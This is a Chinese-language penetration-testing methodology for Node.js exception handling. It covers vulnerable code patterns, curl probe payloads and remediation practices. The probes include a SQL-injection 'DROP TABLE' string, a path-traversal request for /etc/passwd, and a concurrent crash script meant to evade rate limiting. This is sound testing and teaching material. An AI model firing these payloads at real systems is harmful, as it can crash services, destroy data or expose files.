# Node.js 异常处理测试方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 Node.js 应用异常处理检测和利用流程。针对 Node.js 特有的异步编程模型、事件驱动架构和错误处理机制，提供系统性的测试方法。

## 1.2 适用范围

本文档适用于：
- 使用 Node.js 开发的 Web 应用和 API 服务
- 使用 Express、Koa、NestJS 等框架的应用
- 使用异步/await、Promise、回调函数的 Node.js 代码
- 微服务架构中的 Node.js 服务

## 1.3 读者对象

- 执行渗透测试任务的安全工程师
- 安全分析师
- 负责代码审计的开发人员
- Node.js 应用安全架构师

---

# 第二部分：核心渗透技术专题

## 专题一：Node.js 异常处理测试

### 2.1 技术介绍

Node.js 异常处理具有其特殊性，主要源于其异步编程模型：

**Node.js 错误处理特点：**
- 同步代码使用 try-catch
- 异步代码使用错误优先回调 (error-first callbacks)
- Promise 使用 .catch() 或 try-catch (async/await)
- 未捕获异常可能导致进程退出
- 未处理的 Promise 拒绝可能被忽略

**常见 CWE 映射：**

| CWE 编号 | 描述 | Node.js 场景 |
|---------|------|-------------|
| CWE-248 | 未捕获的异常 | 缺少全局异常处理器 |
| CWE-636 | 未安全失败 | 错误处理中返回成功状态 |
| CWE-209 | 错误消息泄露敏感信息 | 返回完整错误堆栈 |
| CWE-460 | 异常时清理不当 | 数据库连接未关闭 |
| CWE-754 | 异常条件检查不当 | 未检查异步操作结果 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 异步 API 调用 | 数据库查询、HTTP 请求 | Promise 拒绝未处理 |
| 文件操作 | 文件上传、读取配置 | fs 回调错误未处理 |
| 流处理 | 大文件传输、视频流 | stream error 事件未监听 |
| 事件 emitter | 自定义事件、消息队列 | error 事件未捕获导致崩溃 |
| 中间件链 | Express 中间件、管道处理 | next(err) 未正确传递 |
| 定时器 | setTimeout、setInterval | 回调中的异常未捕获 |
| 子进程 | exec、spawn 调用系统命令 | 子进程错误未处理 |

### 2.3 漏洞探测方法

#### 2.3.1 未捕获异常检测

**测试技术：**

```javascript
// Node.js 高危代码模式 1：未处理的 Promise 拒绝
async function getUser(id) {
    const user = await db.query('SELECT * FROM users WHERE id = ?', [id]);
    // 如果 query 抛出异常，未被捕获
    return user.name;
}

// Node.js 高危代码模式 2：空 catch 块
try {
    riskyOperation();
} catch (e) {
    // 静默忽略 - 漏洞！
}

// Node.js 高危代码模式 3：回调错误未检查
fs.readFile('config.json', (err, data) => {
    // 未检查 err 就直接使用 data - 漏洞！
    const config = JSON.parse(data);
});

// Node.js 高危代码模式 4：EventEmitter 未监听 error
const emitter = new EventEmitter();
emitter.emit('error', new Error('Something wrong'));
// 如果没有监听 error 事件，进程会崩溃
```

**探测 Payload：**

```bash
# 1. 触发异步异常
curl -X POST https://target.com/api/query \
  -H "Content-Type: application/json" \
  -d '{"id": "invalid_id_cause_exception"}'

# 2. 触发文件操作异常
curl -X GET https://target.com/api/file?path=/nonexistent/path

# 3. 触发数据库异常
curl -X GET https://target.com/api/user?id='; DROP TABLE users;--

# 4. 触发流处理异常
curl -X POST https://target.com/api/upload \
  -H "Content-Type: multipart/form-data" \
  -F "file=@malformed_file"

# 5. 触发 JSON 解析异常
curl -X POST https://target.com/api/data \
  -H "Content-Type: application/json" \
  -d '{invalid json}'
```

#### 2.3.2 全局异常处理器检测

**检测未捕获异常：**

```bash
# 发送会触发未处理异常的请求
# 观察：
# 1. 进程是否崩溃（连接重置）
# 2. 是否返回详细错误堆栈
# 3. 错误是否被正确捕获

# 检测全局 uncaughtException 处理器
curl -X GET https://target.com/api/crash

# 检测 unhandledRejection 处理器
curl -X POST https://target.com/api/async-crash
```

**Express 应用检测：**

```javascript
// 检查是否有全局错误处理中间件
// 应该存在类似代码：
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ message: 'Something broke!' });
});

// 如果没有，应用可能返回详细错误或崩溃
```

#### 2.3.3 中间件错误传递检测

**测试错误传递链：**

```bash
# 在中间件链中触发错误
# 观察错误是否被正确处理

# 测试认证中间件
curl -X GET https://target.com/api/protected \
  -H "Authorization: Bearer invalid_token"

# 测试验证中间件
curl -X POST https://target.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"required_field": null}'

# 测试错误是否泄露中间件信息
# 响应中是否包含中间件名称、版本等
```

### 2.4 漏洞利用方法

#### 2.4.1 利用未处理 Promise 拒绝

**攻击场景：**

```javascript
// 目标代码
app.post('/api/user', async (req, res) => {
    const user = await User.findById(req.body.id);
    // 如果 findById 抛出异常且未捕获
    // 可能导致未处理的 Promise 拒绝
    res.json({ name: user.name });
});

// 利用方法
POST /api/user
{"id": "invalid_object_id"}

// 结果：
// - 无全局处理器：进程崩溃
// - 有默认处理器：返回详细错误堆栈
```

#### 2.4.2 利用 EventEmitter 错误

**攻击场景：**

```javascript
// 目标代码
const emitter = new EventEmitter();

emitter.on('data', (data) => {
    // 如果这里抛出异常
    throw new Error('Processing failed');
});

// 没有监听 error 事件
// emitter.emit('error') 会导致进程崩溃

// 利用方法
// 触发会发出 error 事件的操作
```

#### 2.4.3 利用流处理错误

**攻击场景：**

```javascript
// 目标代码
app.post('/upload', (req, res) => {
    const stream = fs.createWriteStream('/tmp/upload');
    req.pipe(stream);
    // 未监听 stream 的 error 事件
    // 如果写入失败，错误未处理
    res.send('Upload complete');
});

// 利用方法
// 发送大文件或中断上传
// 导致流错误未处理
```

#### 2.4.4 利用回调错误未检查

**攻击场景：**

```javascript
// 目标代码
fs.readFile('/etc/secrets.json', (err, data) => {
    // 未检查 err
    // 如果文件不存在，data 为 undefined
    const secrets = JSON.parse(data);
    // TypeError: Cannot parse undefined
});

// 利用方法
// 触发文件读取失败
// 导致后续操作异常
```

#### 2.4.5 错误信息泄露利用

**从错误响应中提取信息：**

```
典型 Node.js 错误信息泄露：

1. 堆栈跟踪泄露
Error: User not found
    at UserController.getUser (/app/controllers/user.js:25:11)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)

泄露信息：
- 文件路径：/app/controllers/user.js
- 代码行号：25
- 使用的框架：Express
- 框架版本：从路径推断

2. 数据库错误泄露
MongoError: E11000 duplicate key error collection: db.users index: email_1
泄露信息：
- 数据库类型：MongoDB
- 集合名：users
- 索引字段：email

3. SQL 错误泄露
error: syntax error at or near "'"
泄露信息：
- 数据库类型：PostgreSQL
- 查询结构信息
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过错误处理中间件

```bash
# 某些应用只在特定路由有错误处理
# 尝试：

# 1. 访问不存在的路由
GET /nonexistent-route

# 2. 使用不同 HTTP 方法
DELETE /api/resource  # 可能没有 DELETE 的错误处理

# 3. 访问静态文件触发异常
GET /static/../../../etc/passwd
```

#### 2.5.2 利用异步时序问题

```javascript
// 利用异步操作的时序问题
// 在错误处理完成前发送新请求

// 攻击脚本示例
const requests = [];
for (let i = 0; i < 100; i++) {
    requests.push(fetch('https://target.com/api/crash', {
        method: 'POST',
        body: JSON.stringify({ trigger: 'exception' })
    }));
}
// 并发发送，可能绕过速率限制和错误处理
Promise.all(requests);
```

#### 2.5.3 利用集群模式的不一致

```bash
# Node.js 集群模式下，不同 worker 可能有不同状态
# 发送大量请求直到所有 worker 进入错误状态

# 或者利用 worker 间状态不同步
# Worker 1 处理了部分请求后崩溃
# Worker 2 继续处理但状态不一致
```

---

# 第三部分：附录

## 3.1 Node.js 异常处理测试清单

```
□ 测试未捕获的异常
□ 测试未处理的 Promise 拒绝
□ 测试 EventEmitter error 事件
□ 测试流处理错误
□ 测试回调错误检查
□ 测试中间件错误传递
□ 测试全局异常处理器
□ 测试错误信息泄露
□ 测试进程崩溃行为
□ 测试集群模式错误处理
```

## 3.2 常见 Node.js 错误模式

| 错误类型 | 特征 | 风险等级 |
|---------|------|---------|
| UncaughtException | 未捕获的同步异常 | 高 |
| UnhandledRejection | 未处理的 Promise 拒绝 | 高 |
| EventEmitter error | 未监听的 error 事件 | 高 |
| Stream error | 流处理错误未监听 | 中 |
| Callback error ignored | 回调错误未检查 | 高 |
| next() not called | 中间件未调用 next | 中 |
| Async error not caught | 异步函数异常未捕获 | 高 |

## 3.3 安全错误处理最佳实践

```javascript
// 1. 使用全局异常处理器
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
    // 记录日志后优雅退出
    process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    // 记录日志
});

// 2. Express 全局错误处理中间件
app.use((err, req, res, next) => {
    console.error(err.stack);
    // 生产环境不返回详细错误
    res.status(500).json({ 
        message: 'Internal server error',
        error: process.env.NODE_ENV === 'development' ? err.message : undefined
    });
});

// 3. 始终检查回调错误
fs.readFile('file.txt', (err, data) => {
    if (err) {
        console.error('Read failed:', err);
        return;
    }
    // 处理数据
});

// 4. 使用 try-catch 包裹 async/await
app.post('/api/user', async (req, res) => {
    try {
        const user = await User.findById(req.body.id);
        res.json({ name: user.name });
    } catch (err) {
        console.error('User lookup failed:', err);
        res.status(500).json({ message: 'User lookup failed' });
    }
});

// 5. 监听流的 error 事件
const stream = fs.createWriteStream('/tmp/file');
stream.on('error', (err) => {
    console.error('Stream error:', err);
});
req.pipe(stream);
```

## 3.4 自动化检测工具

| 工具 | 用途 | 命令示例 |
|-----|------|---------|
| ESLint + eslint-plugin-security | 代码静态分析 | `eslint --plugin security` |
| SonarQube | 代码质量检查 | Node.js 规则集 |
| Snyk Code | 安全扫描 | `snyk code test` |
| Burp Suite | 动态测试 | 手动/自动扫描 |
| clinic.js | 性能诊断 | `clinic doctor` |

---

**参考资源：**
- [Node.js Error Handling Best Practices](https://nodejs.org/api/errors.html)
- [Express Error Handling](https://expressjs.com/en/guide/error-handling.html)
- [OWASP Node.js Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html)
- [CWE-754](https://cwe.mitre.org/data/definitions/754.html)
